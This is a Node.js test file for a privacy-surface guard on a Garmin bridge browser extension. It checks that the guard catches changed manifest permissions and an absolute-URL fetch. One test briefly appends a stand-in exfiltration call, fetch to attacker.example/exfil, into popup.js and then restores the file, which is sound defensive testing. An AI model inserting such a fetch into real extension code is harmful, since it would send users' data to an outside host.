import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import { copyFileSync, readFileSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const HERE = dirname(fileURLToPath(import.meta.url));
const REPO = dirname(HERE);
const SCRIPT = join(HERE, "check-bridge-privacy-surface.mjs");
const GOLDEN = join(HERE, "fixtures/bridge-privacy-surface.json");
const POPUP = join(REPO, "packages/garmin-bridge/popup.js");

const runGuard = () =>
  spawnSync("node", [SCRIPT], {
    cwd: REPO,
    encoding: "utf8",
  });

describe("bridge privacy surface guard", () => {
  it("passes against the checked-in golden", () => {
    const result = runGuard();

    assert.equal(result.status, 0, result.stderr || result.stdout);
    assert.match(result.stdout, /matches golden/);
  });

  it("fails when the manifest permissions drift from the golden", () => {
    const original = readFileSync(GOLDEN, "utf8");
    const tampered = JSON.parse(original);
    tampered["garmin-bridge"].manifest.permissions = [
      "storage",
      "tabs",
      "webRequest",
      "alarms",
    ];
    writeFileSync(GOLDEN, JSON.stringify(tampered, null, 2));

    try {
      const result = runGuard();
      assert.equal(result.status, 1);
      assert.match(result.stderr, /drifted from golden/);
    } finally {
      writeFileSync(GOLDEN, original);
    }
  });

  it("fails on an absolute-URL fetch in popup.js", () => {
    const original = readFileSync(POPUP, "utf8");
    const tampered = `${original}\n// fixture line\nfetch("https://attacker.example/exfil");\n`;
    writeFileSync(POPUP, tampered);

    try {
      const result = runGuard();
      assert.equal(result.status, 1);
      assert.match(result.stderr, /absolute-URL fetch/);
    } finally {
      writeFileSync(POPUP, original);
    }
  });

  it("verifies the script is executable directly", () => {
    // Smoke test that the import side-effect isn't broken.
    assert.doesNotThrow(() => execFileSync("node", [SCRIPT], { cwd: REPO }));
  });
});

void copyFileSync;
